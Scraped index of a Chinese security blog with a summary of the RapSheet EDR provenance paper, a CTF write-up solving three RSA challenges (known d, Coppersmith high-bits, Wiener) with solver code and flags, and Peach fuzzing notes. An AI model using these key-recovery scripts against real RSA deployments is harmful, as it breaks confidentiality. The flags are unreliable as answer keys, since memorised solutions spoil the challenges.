Writeup","uri":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/"},{"categories":["学习","安全技术"],"content":"\r","date":"2022-01-06","objectID":"/2022-01-06-%E7%AB%AF%E7%82%B9%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%88%98%E6%9C%AF%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/:0:0","tags":["学术研究"],"title":"端点检测与响应系统的战术溯源分析","uri":"/2022-01-06-%E7%AB%AF%E7%82%B9%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%88%98%E6%9C%AF%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/"},{"categories":["学习","安全技术"],"content":"0x00 前言 原论文是2020年IEEE Symposium on Security and Privacy (SP)的一篇文章《Tactical provenance analysis for endpoint detection and response systems》。 之所以选择这篇作为研讨厅的题目，是因为组内在做自动化渗透测试的系统，然后各个模块之间采用了ATT\u0026CK的各种技术手段，所有的技术是不等价的，在攻击的过程中也不能盲目追求覆盖率，需要选择简单、有效、擅长的方法，这样每个模块间如何组合一个攻击高效的工具链就是一个值得研究的问题，然后我就想到能不能采用一种评分的机制，对各类威胁进行一个排列，优先采取高评分的威胁展开攻击，于是找到了这一篇论文，它创新性地提出一种威胁评分的机制，我觉得值得借鉴学习。 ","date":"2022-01-06","objectID":"/2022-01-06-%E7%AB%AF%E7%82%B9%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%88%98%E6%9C%AF%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/:1:0","tags":["学术研究"],"title":"端点检测与响应系统的战术溯源分析","uri":"/2022-01-06-%E7%AB%AF%E7%82%B9%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%88%98%E6%9C%AF%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/"},{"categories":["学习","安全技术"],"content":"0x01 ATT\u0026CK介绍 ATT\u0026CK是什么呢？这里给出了官方的定义，MITRE公司的对抗战术、技术和常识( Adversarial Tactics, Techniques, and Common Knowledge;ATT\u0026CK)是一个精心策划的网络对手行为知识库和模型，反映了对手攻击生命周期的各个阶段以及他们已知的目标平台. 简单来说，它是一个攻击行为知识库和模型。 核心理念与要素是TTP（Tactics, Techniques and Procedures；战术, 技术与过程），当前ATT\u0026CK是V10版本，共有14种战术。 1. 侦查：收集信息以计划未来对手的行动，即有关目标组织的信息\r2. 资源准备：建立资源以支持作战，即建立指挥和控制基础设施\r3. 初始访问：尝试突破边界进入网络，包含常规入侵和社会工程学入侵。\r4. 执行：尝试运行恶意代码，运行远程访问工具\r5. 持久化：通过修改系统配置和策略，试图建立长期据点。\r6. 权限提升：通过利用漏洞提升访问权限，试图获得更高级别的权限\r7. 防御规避：使用受信任的进程来隐藏恶意软件，试图规避检测\r8. 凭据窃取：窃取用户名和密码等凭据，例如利用键盘记录\r9. 内部探测：探索内部环境中所有系统，试图弄清楚所在环境\r10.横向移动：内网横向移动，即使用合法凭证在多个系统中移动\r11.数据收集：收集目标中有价值的数据，例如访问云存储中的数据\r12.命令和控制：与受感染的系统通信以控制它们，即模仿正常的网络流量与受害网络通信以进行远程控制\r13.数据渗漏：窃取数据，例如通过隐蔽隧道转移数据到云账户\r14.影响：操纵、中断或破坏系统和数据，即使用勒索软件加密数据\r其中一个技术会被用于实现多个战术，过程则是该技术在实际攻击中的具体实现。下图中列出了执行、持久化、权限提升三种战术，每一行是战术，每一列是技术，可以看到定时任务这个技术在不同的战术中出现了三次。这里也给出了一个进程实例，比如说Lokibot是一个信息窃取程序，它在第二阶段 DLL 使用“timeSetEvent”设置了一个计时器来安排它的下一次执行。 ATT\u0026CK的抽象层级是位于中间的，Cyber Kill Chain和STRIDE威胁模型可以划分为高层次模型，可以用来表达和理解高层次的攻击者目标和防护系统风险。这些高层模型抽象层次高，自然难以表达具体的攻击行为和攻击行为关联的具体的数据、防护措施、配置资源等。例如，我们可将某一IOC或攻击行为对应到攻击链的“C\u0026C”阶段，这提醒防御方需要采取必要的措施了，但采取怎样的措施，攻击链模型是难以表达的。而在ATT\u0026CK中，该IOC可能对应到战术 “Command and Control”，同时采用的是“Multi-hop Proxy”的技术手段以达成战术目标，至此，我们可以进一步获取针对该技术手段的一些通用的防护措施。当然，中层次的ATT\u0026CK所描述的仍然是TTP的抽象，具体到实例化的行为描述，仍然需要细粒度的划分。 漏洞库及漏洞利用模型划分为低层次概念。我们可以认为CAPEC、CWE属于这个抽象层次。CAPEC（Common Attack Pattern Enumeration and Classification）关注的是攻击者对网络空间脆弱性的利用，其核心概念是攻击模式Attack Pattern。从攻击机制的角度，CAPEC通过多个抽象层次对攻击进行分类和枚举。其目标是全面的归类针对已知的应用程序脆弱性的攻击行为。相对而言，ATT\u0026CK的目标不是对不同攻击战术目标下技术的穷尽枚举，而是通过APT等攻击组织的可观测数据提取共性的战术意图和技术模式。战术意图是CAPEC枚举库难以表达的。从攻击检测的角度来看，只有明确攻击技术的战术意图，才能进一步推测攻击的关联上下文信息，以支持攻击威胁的评估和响应。此外，通过提供攻击组织（group）和软件（software）信息，ATT\u0026CK还能够串联起威胁情报和事件检测数据，打通对威胁事件的理解链路。 ATT\u0026CK适用的场景很多，很多安全企业都在投入研究，而MITRE官方推荐如下： 对手模拟：通过获取对手的入侵情报并模拟他们的入侵行为来评估自身的安全性。ATT\u0026CK可用于创建入侵者模拟场景来测试和验证防御。\r红队建设：红队的实战参考手册，ATT\u0026CK 可用于创建红队攻击知识框架，并组织入侵行为。\r行为分析开发：将可疑活动特征联系在一起以监控对手的活动。ATT\u0026CK 可用于简化并提炼可疑恶意活动行为模式。\r威胁情报：ATT\u0026CK 允许防御者评估他们是否能够防御特定的高级持续威胁 (APT) 和构建威胁参与者的常见行为模型。\r防御差距评估：确定企业的哪些部分缺乏防御或可见性。ATT\u0026CK 可用于评估现有工具，或在购买之前测试新工具，以确定安全范围和优先投资。\r安全运营成熟度评估：与防御差距评估类似，ATT\u0026CK 可用于验证安全运营中心 (SOC) 在检测、分析和响应漏洞方面的能力成熟度。\r根据全球最具权威的IT研究与顾问咨询公司Gartner的调查，前10个顶级EDR工具都利用了ATT\u0026CK知识库来检测对手的行为。那么下面就为大家介绍下什么是EDR。 ","date":"2022-01-06","objectID":"/2022-01-06-%E7%AB%AF%E7%82%B9%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%88%98%E6%9C%AF%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/:2:0","tags":["学术研究"],"title":"端点检测与响应系统的战术溯源分析","uri":"/2022-01-06-%E7%AB%AF%E7%82%B9%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%88%98%E6%9C%AF%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/"},{"categories":["学习","安全技术"],"content":"0x02 EDR介绍 端点检测与响应（Endpoint Detection \u0026 Response，EDR），是一种持续监控和响应以减轻网络威胁的网络技术。 端点指的是用于访问组织数据和网络的任何连接设备，比如PC、服务器、移动设备。 EDR的工作流程如图 EDR 能够兼容各类网络架构。EDR 能够广泛适应传统计算机网络、云计算、边缘计算等各类网络架构，能够适用于各种类型的端点，且不受网络和数据加密的影响。 EDR 辅助管理员智能化应对安全威胁。EDR 对安全威胁的发现、隔离、修复、补救、调查、分析和取证等一系列工作均可自动化完成，大大降低了发现和处置安全威胁的复杂度，能够辅助用户更加快速、智能地应对安全威胁。 EDR 具有精准识别攻击的先天优势。端点是攻防对抗的主战场，通过 EDR 在端点上实施防御能够更加全面地搜集安全数据，精准地识别安全威胁，准确判定安全攻击是否成功，准确还原安全事件发生过程。 EDR与传统安全产品被动检测、以管代防的思路不同他是一种主动的安全方法，EDR并不依赖已知攻击特征，而是主动采集数据，通过情报碰撞、威胁模型分析等方式综合研判，发现未知威胁。 并且EDR能够主动寻找攻击痕迹进行威胁溯源，通过全量信息关联，为发现高级威胁提供更有力的数据支撑。 EDR 完整覆盖端点安全防御全生命周期。事件发生前，实时主动采集端安全数据和针对性地进行安全加固；事件发生时，通过异常行为检测、智能沙箱分析等主动发现和阻止威胁；安全事件发生后，通过端点数据追踪溯源。 ","date":"2022-01-06","objectID":"/2022-01-06-%E7%AB%AF%E7%82%B9%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%88%98%E6%9C%AF%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/:3:0","tags":["学术研究"],"title":"端点检测与响应系统的战术溯源分析","uri":"/2022-01-06-%E7%AB%AF%E7%82%B9%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%88%98%E6%9C%AF%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/"},{"categories":["学习","安全技术"],"content":"0x03 现存EDR的挑战和解决方案 首先，误报多，EDR工具存在大量虚假情报，容易引发警报疲劳，淹没有效信息，使得分析困难； 其次，生成上下文困难，判断警报的准确性需要大量低级日志信息，任务繁琐，上下文生成需要大量的手动工作和时间，这可能会延迟调查和恢复。 而且即使分析人员成功生成了警报的上下文，也很难通过查看系统级事件来了解整个攻击活动的进展。 最后，EDR工具通常使用FIFO队列，根据供应商的保留策略，一般仅保留几天。由于日志占用巨大资源，通常在进行调查之前就被删除。 当前学术界针对这些挑战，提出了数据溯源的思想。将日志解析为溯源图。这样有两个好处，一是描述系统执行的整体性，二是促进对系统活动的因果分析。 基于这一思想，本文就实现了RapSheet系统，基于溯源的解决EDR工具现存缺陷的最佳方案。 采用TPG战术溯源图，提供多阶段攻击的紧凑可视化，加速调查。 为了解决EDR的误报问题，提出了一种基于TPGs中各个威胁警报之间的时间顺序的威胁评分方法。 最后，之前笨重的系统日志保留相比，维护了一个最低限度的骨架图，可以提供现有和未来的威胁警报之间的可连接性。 ","date":"2022-01-06","objectID":"/2022-01-06-%E7%AB%AF%E7%82%B9%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%88%98%E6%9C%AF%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/:4:0","tags":["学术研究"],"title":"端点检测与响应系统的战术溯源分析","uri":"/2022-01-06-%E7%AB%AF%E7%82%B9%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%88%98%E6%9C%AF%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/"},{"categories":["学习","安全技术"],"content":"0x04 系统架构 首先，RapSheet对系统日志进行规则匹配，以确定符合ATT\u0026CK行为的事件。接下来，我们从日志中生成一个溯源图数据库。在图的生成过程中，我们对与前一步中的ATT\u0026CK技术相匹配的事件边进行注释。一旦完成带有警报注释的溯源图的构建，我们首先确定初始感染点 (IIP) 顶点，即时间线中生成威胁警报的第一个顶点。使用前向追踪在顶点的后代中找到所有警报，移除无关的系统事件，就会得到一个战术溯源图 (TPG)，显示因果相关警报的排序方式。最后执行威胁评分。战术溯源分析和威胁分数评估是RapSheet在威胁分析方面的最大创新点，能够提升EDR威胁检测精确度，检测未知攻击行为。 下面我会按照从左到右的顺序，详细展开每一个步骤。 EDR工具会将各个主机上的系统日志，收集汇总。不同的操作系统有不同的收集策略，但日志的内容是统一的，包括低级别的系统事件，比如进程启动和文件操作。它们反映了不同系统实体之间的因果关系。 比如：一个父进程创建一个子进程之间的因果关系是由捕获对sys_clone()的调用而产生的事件来表示的 在windows日志方面，本文引入了对ALPC消息的收集来作为补充。ALPC是Windows 组件用于进程间通信的机制，许多攻击部分表现为使用 ALPC 消息启动的系统活动。如果缺少这些因果关系可能会断开溯源的链路，破坏取证调查。 日志收集后会进入规则匹配来发出警报。下面给出了一个简化的规则样例，可以看到如果匹配到连接的动作和3389的目的端口，就会生成一个T1076,远程桌面协议的警报。在右图中我们可以看到mstsc这个进程的连接操作时匹配到规则的，这时就会生成警报。 之后，我们会将日志和警报传入RapSheet，生成溯源图数据库。 每个主机上的系统日志都被解析为一个称为溯源图的图结构。这里给出了一个溯源图的数据模型。 RapSheet生成的溯源图类似于之前在溯源图上的工作，其中添加了一些新的内容来推理ATT\u0026CK策略。 包含两种类型的顶点：进程顶点类型和对象顶点类型，其中包括文件、注册表等。 连接这些顶点的边被标记为一个事件类型，描述了它们之间的关系连接的实体和事件发生的时间戳。 此外，进程顶点标有开始和终止时间，这使我们可以在分析期间检查进程是否还活着。 我们还在溯源图数据库中实现了CPR (Causality Preserved Reduction ，因果关系保留减少)技术，合并了两个具有相同操作的顶点之间的边，并且只保留一个带有最新时间戳的边。 例如，大多数操作系统和许多 EDR 会为单个文件操作生成多个系统级事件。RapSheet 这些事件聚合到起源图中的单个边中。 可以有效减少溯源图的大小，同时仍然保持因果分析的正确性。 然后，我们进入关键环节，战术溯源分析。经过上一步我们得到一系列触发的警报和主机溯源图。在图中找到所有初始感染点（IIP），我们将 IIP 定义为满足两个条件的顶点。**对应于生成一个警报事件的过程且向后跟踪，溯源图中不包含其他警报事件。**如果IIP顶点对应的过程是多阶段攻击的第一步，那么其余的攻击将被此过程及其后代生成的未来警报捕获，我们可以对相关警报进行分组。 IIP图定义：给定一个溯源图G \u003cV，E\u003e和警报事件_e_a发生于IIP节点_V_a上，该IIP图G’\u003cV’，E’\u003e是一个以_V_a为根的图，其中e∈E’，如果e与_e_a有因果关系，并且e是一个警报事件或一个引发警报事件的事件。 对于每个IIP顶点通过DFS返回所有前向跟踪的路径，返回溯源路径中的所有警报事件，进行修剪，在IIP图中只保留那些至少包含一个警告的路径。 序列边定义：两个警报之间存在序列边(ea, eb)，并且满足以下任一条件: ea和_eb是同一台主机和同一溯源路径上的警报，且_ea是_eb_前向的因果关系。 ea和_eb是同一主机上的警报，且_ea顶点的时间戳小于_eb_ ea 在一台主机上有一个传出的连接事件边，且_eb_有一个回应的接收事件边。 TPG定义：TPG可以定义为一对(V,E)，其中V是一组威胁警报事件，而E是顶点之间的一组序列边。 TPG 对分析人员可视化多阶段 APT 活动很有用，因为它可视化显示了攻击的时间顺序和因果相关阶段，而不会陷入低级系统事件。 IIP图实例和TPG图实例如下。 RapSheet 的一个关键目标是对警报进行分组并为其分配一个威胁评分，该评分可用于对这些情境化警报进行分类。 由于某些警报可疑性更大，因此我们采用了一种评分机制，其中包含单个警报的风险评分，包括两个风险评估指标：“攻击可能性”和“典型严重性”。每一个都按照非常低（1分），低（2分），中（3分），高（4分），非常高（5分）的五类等级进行评分。 最终得分为 第一个指标反映了一个特定的攻击模式成功的可能性有多大，考虑到诸如攻击的前提条件、攻击者所需的资源以及应对的防御措施的有效性等因素。 第二个指标旨在掌握成功实施攻击的后果有多严重。 我们给予严重性分数比可能性分数更高的权重，因为我们要防御的是先进的对手。他们可以有效地执行那些由于难度或成本而被认为不太可能的技术。 下面具一个例子，ATT\u0026CK中的钓鱼技术，对应CAPEC这个常用攻击类型的分类数据集的98，找到它的指标，即可计算警报分数。然而ATT\u0026CK和CAPEC并不是完全匹配的，文章中其他技术的指标是结合EDR厂商自定义的。 为了将单个警报得分组合为总体得分，选择基于TPG的评分方案，因为基于路径的方法无法捕获攻击的整个上下文。 我们找到这些有序警报中最长的（不一定是连续的）子序列，它与MITRE的战术杀伤链的阶段顺序一致。 然后，我们将这个子序列中各个警报的分数相乘，给TPG一个总分。如果有多个最长的子序列，我们选择产生最高总分的那个。 系统日志支持 EDR 工具的两个关键功能：1) 基于警报关联的威胁警报分类和 2) 使用攻击活动可视化进行事后攻击调查。因此，EDR 工具需要将这些日志保留足够长的时间以提供这些功能。然而，在大型企业中，系统日志会迅速变得庞大，使得长期保留十分困难。如何有效地使用这个有限的内存来存储是很重要的课题。 这篇文章提出了一种新技术来降低日志的保真度，同时仍然提供两个关键的 EDR 功能。提出了以下两个规则来在任何时间点修剪出处图，同时保留基于 TPG 的警报相关性。 规则1：删除对象顶点O，如果O的后向追踪图中没有警报事件，且没有直连到O的警报事件边； 规则2：删除进程顶点P，如果①P的后向追踪图中没有警报事件，②没有直连到P警报事件边，③P被终止。 在每个可配置的时间间隔后，RapSheet 运行图缩减并仅存储骨架图，从而保留当前和未来策略之间的可链接性。 ","date":"2022-01-06","objectID":"/2022-01-06-%E7%AB%AF%E7%82%B9%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%88%98%E6%9C%AF%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/:5:0","tags":["学术研究"],"title":"端点检测与响应系统的战术溯源分析","uri":"/2022-01-06-%E7%AB%AF%E7%82%B9%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%88%98%E6%9C%AF%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/"},{"categories":["学习","安全技术"],"content":"0x04 实验评估 ","date":"2022-01-06","objectID":"/2022-01-06-%E7%AB%AF%E7%82%B9%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%88%98%E6%9C%AF%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/:6:0","tags":["学术研究"],"title":"端点检测与响应系统的战术溯源分析","uri":"/2022-01-06-%E7%AB%AF%E7%82%B9%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%88%98%E6%9C%AF%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/"},{"categories":["学习","安全技术"],"content":"0x05 总结 ","date":"2022-01-06","objectID":"/2022-01-06-%E7%AB%AF%E7%82%B9%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%88%98%E6%9C%AF%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/:7:0","tags":["学术研究"],"title":"端点检测与响应系统的战术溯源分析","uri":"/2022-01-06-%E7%AB%AF%E7%82%B9%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%88%98%E6%9C%AF%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/"},{"categories":["WriteUp"],"content":"\r","date":"2021-12-24","objectID":"/2021-12-24-%E4%B8%89%E9%81%93crypto%E7%BB%83%E4%B9%A0/:0:0","tags":["CTF","密码学"],"title":"三道Crypto练习","uri":"/2021-12-24-%E4%B8%89%E9%81%93crypto%E7%BB%83%E4%B9%A0/"},{"categories":["WriteUp"],"content":"0x00 pwnhub公开赛-sign_in_rsa from Crypto.Util.number import getPrime, long_to_bytes, bytes_to_long, inverse\rimport math\rfrom gmpy2 import next_prime\rFLAG = b\"flag{************************************************}\"\rp = getPrime(1024)\rq = getPrime(1024)\rN = p*q\rphi = (p-1)*(q-1)\re = 0x10001\rd = inverse(e, phi)\rmy_key = (N, d)\rfriends = 5\rfriend_keys = [(N, getPrime(17)) for _ in range(friends)]\rcipher = bytes_to_long(FLAG)\rfor key in friend_keys:\rcipher = pow(cipher, key[1], key[0])\rprint(f\"My private key: {my_key}\")\rprint(f\"My Friend's public keys: {friend_keys}\")\rprint(f\"Encrypted flag: {cipher}\")\r首先分析代码在output.txt里面My private key表示N和D，My Friend’s public keys表示五组素数与N，然后是加密完的密文C。盘一下已知的数，E、N、D、C和五组素数。 原本的flag是将五组素数分别作为e，加密后得到密文的，所以需要倒推这个过程，然而N无法分解，但我们有E和D，E*D=k*(p-1)*(q-1)，这里把E*D设为PHI。我们知道N的位数是2046位，PHI的位数则是2061-2062位，也就是说k的取值范围在2的15次方和16次方之间。 编写脚本后可以发现k的取值只有四种可能：36906、55359、56774、61510。 最终脚本如下： import gmpy2\rfrom Crypto.Util.number import *\re = [107273,80021,110281,125399,77641]\rPHI = D*E-1\rposs_phi = []\rfor k in range(pow(2,15),pow(2,16)):\rif PHI %k == 0:\rposs_phi.append(PHI//k)\rfor i in poss_phi:\rc=C\rfor j in range(4,-1,-1):\rd = gmpy2.invert(e[j],i)\rc = pow(c,d,N)\rprint (long_to_bytes(c))\r在输出中找到flag{3ncrypt_y0ur_s3cr3t_w1th_y0ur_fr1end5_publ1c_k3y} ","date":"2021-12-24","objectID":"/2021-12-24-%E4%B8%89%E9%81%93crypto%E7%BB%83%E4%B9%A0/:1:0","tags":["CTF","密码学"],"title":"三道Crypto练习","uri":"/2021-12-24-%E4%B8%89%E9%81%93crypto%E7%BB%83%E4%B9%A0/"},{"categories":["WriteUp"],"content":"0x01 已知p高位攻击 from secret import flag\rfrom Crypto.Util.number import *\rm = bytes_to_long(flag)\rp = getPrime(512)\rq = getPrime(512)\rN = p * q\re = 7\rc = pow(m, e, N)\rhigh_p = (p \u003e\u003e 100) \u003c\u003c 100\rprint(c, N, high_p, sep='\\n')\r从代码中可以看到，p的值经过了左移右移，得到的high_p，我们可以转换成16进制看一下，0xf1f642e6084bc092c008d07d821d5722fa98c5d424db505332622a1506e0d22d5e42d4d1025eb24e665f23b1e6041b6dd96705d0000000000000000000000000，可以发现后面全部是0，但高位已知，该后门算法依赖于Coppersmith partial information attack算法，sage代码如下： n = 99887986204824691113457754897953425406993412586030259044004283966194202433452866024995465248688896193125819761385921365388030307691682145106269184432165936577174730773115650122496935533603059557681592007428920955897003476296682566264772005134125852663260971355535474414913501328212769545952135420770881499467 p = 12672576027810761975840956553905924324108169270520824932988309977042643967090398117355253953195633095326913407044418517938976916071656473263683948565757952 kbits = 100//kbit是未知的p的低位位数 PR.\u003cx\u003e = PolynomialRing(Zmod(n))//生成一个以x为符号的一元多项式环 f = x + p//定义求解的函数 x0 = f.small_roots(X=2^kbits, beta=0.4)[0]//多项式小值根求解及因子分解,X表示求解根的上界,x0为求出来的p低位 print (\"x: %s\" %int(x0)) p = p+x0 print (\"p: \", int(p)) assert n % p == 0 q = n/int(p) print (\"q: \", int(q)) 得到结果： x: 389012076266827076910275508475 p: 12672576027810761975840956553905924324108169270520824932988309977042643967090398117355253953195633095326913407044418517938977305083732740090760858841266427 q: 7882216369080307573684148336656348276125777637863593106760322365174229732530885238209013585945585289415095195664039487452042451160318978844874180224833521 已知p、q后就是一个简单的解密过程了，最后得到结果flag {47b9332b7527b8905cc0a31c8496347e} ","date":"2021-12-24","objectID":"/2021-12-24-%E4%B8%89%E9%81%93crypto%E7%BB%83%E4%B9%A0/:2:0","tags":["CTF","密码学"],"title":"三道Crypto练习","uri":"/2021-12-24-%E4%B8%89%E9%81%93crypto%E7%BB%83%E4%B9%A0/"},{"categories":["WriteUp"],"content":"0x02 维纳攻击 from secret import flag\rfrom Crypto.Util.number import *\rm = bytes_to_long(flag)\rp = getPrime(512)\rq = getPrime(512)\rN = p * q\rphi = (p-1) * (q-1)\rwhile True:\rd = getRandomNBitInteger(200)\rif GCD(d, phi) == 1:\re = inverse(d, phi)\rbreak\rc = pow(m, e, N)\rprint(c, e, N, sep='\\n')\r题目给出d的位数最大是200，N的位数是1022，绝对小于254位，这里用到https://github.com/orisano/owiener求解。 d = owiener.attack(e, N)\r已知c,d,N即可解出flag。 ","date":"2021-12-24","objectID":"/2021-12-24-%E4%B8%89%E9%81%93crypto%E7%BB%83%E4%B9%A0/:3:0","tags":["CTF","密码学"],"title":"三道Crypto练习","uri":"/2021-12-24-%E4%B8%89%E9%81%93crypto%E7%BB%83%E4%B9%A0/"},{"categories":["安全技术","学习"],"content":"\r","date":"2021-12-13","objectID":"/2021-12-13-%E7%81%B0%E5%B8%BD%E9%BB%91%E5%AE%A2%E7%AC%AC%E4%BA%94%E7%89%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/:0:0","tags":["安全前沿"],"title":"灰帽黑客（第五版）学习笔记–下一代模糊测试","uri":"/2021-12-13-%E7%81%B0%E5%B8%BD%E9%BB%91%E5%AE%A2%E7%AC%AC%E4%BA%94%E7%89%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/"},{"categories":["安全技术","学习"],"content":"0x00 前言 前两章内容比较浅显，都是些简单的概念，第三章开始知识点变得丰富，这里结合书本、代码以及其他资料，整理记录自己的笔记。 ","date":"2021-12-13","objectID":"/2021-12-13-%E7%81%B0%E5%B8%BD%E9%BB%91%E5%AE%A2%E7%AC%AC%E4%BA%94%E7%89%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/:1:0","tags":["安全前沿"],"title":"灰帽黑客（第五版）学习笔记–下一代模糊测试","uri":"/2021-12-13-%E7%81%B0%E5%B8%BD%E9%BB%91%E5%AE%A2%E7%AC%AC%E4%BA%94%E7%89%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/"},{"categories":["安全技术","学习"],"content":"0x01 FUZZ Fuzz（模糊测试）是一种通过提供非预期的输入并监视异常结果来发现软件安全漏洞的方法。 根据数据生成算法的不同，分类如下： 数据变异，根据已知数据样本通过变异的方法生成新的测试用例。 数据生成，根据已知协议或接口规范进行建模生成新的测试用例。 遗传或进化，使用来自每个测试用例的反馈，以了解随着时间推移输入的格式。例如，通过测量每个测试用例的代码覆盖率，计算出测试用例的哪些属性可以锻炼给定的代码区域，并逐渐演化出一套覆盖大部分程序代码的测试用例。 ","date":"2021-12-13","objectID":"/2021-12-13-%E7%81%B0%E5%B8%BD%E9%BB%91%E5%AE%A2%E7%AC%AC%E4%BA%94%E7%89%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/:2:0","tags":["安全前沿"],"title":"灰帽黑客（第五版）学习笔记–下一代模糊测试","uri":"/2021-12-13-%E7%81%B0%E5%B8%BD%E9%BB%91%E5%AE%A2%E7%AC%AC%E4%BA%94%E7%89%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/"},{"categories":["安全技术","学习"],"content":"0x02 Peach基本知识 Peach是一个优秀的开源Fuzz框架。 Fuzz流程图 开始Fuzz需要创建一个名为Pit的文件，Pit文件是包含模糊测试会话全部配置信息的XML文档。包含的典型信息如下： 通用配置–定义与Fuzz参数无关的配置，如python路径 DataModel–定义了将通过Peach规范化语言的模糊化数据结构 StateModel–定义了用来正确表示协议的状态机 Agent和Monitor–定义Peach分配Fuzz工作量以及检测目标软件故障/漏洞迹象的方式 Test配置–定义Peach创建每一个测试用例的方式以及运用何种模糊测试策略来修改数据 具体详见： http://blog.nsfocus.net/peach-fuzz/ https://www.secpulse.com/archives/119442.html https://github.com/MozillaSecurity/peach ","date":"2021-12-13","objectID":"/2021-12-13-%E7%81%B0%E5%B8%BD%E9%BB%91%E5%AE%A2%E7%AC%AC%E4%BA%94%E7%89%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/:3:0","tags":["安全前沿"],"title":"灰帽黑客（第五版）学习笔记–下一代模糊测试","uri":"/2021-12-13-%E7%81%B0%E5%B8%BD%E9%BB%91%E5%AE%A2%E7%AC%AC%E4%BA%94%E7%89%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/"},{"categories":["安全技术","学习"],"content":"0x03 崩溃追踪 常见方式： 可用来重现崩溃的样本文件或数据记录。发现崩溃时，对于文件Fuzzer，用于测试的样本文件会被保存并做好标记以供审查。对于网络应用Fuzzer，可能记录并保存PCAP文件。 应用程序的崩溃日志文件可通过多种方式收集。发现崩溃时，调试器会收集CPU上下文信息（例如寄存器的状态和栈内存），并同崩溃样本文件一起储存。 许多自定义脚本可在程序崩溃时运行，从而收集特定类型的信息。实现这类脚本最简单的方法就是扩展调试器。 处理崩溃时，Peach使用WinDbg和!exploitable扩展收集崩溃相关的上下文信息并将崩溃归类。 崩溃日志主要由两部分组成： 调试器收集的崩溃信息，包括加载模块名称、CPU寄存器信息和内存片段。 !exploitable报告包含崩溃及其疯了信息。这部分日志提供更多崩溃上下文信息，如异常码、栈帧信息和分类等，分类是对崩溃可利用性潜力的评估结论，包括：Exploitable、Probably Exploitable、Probably Not Exploitable、Unknown。 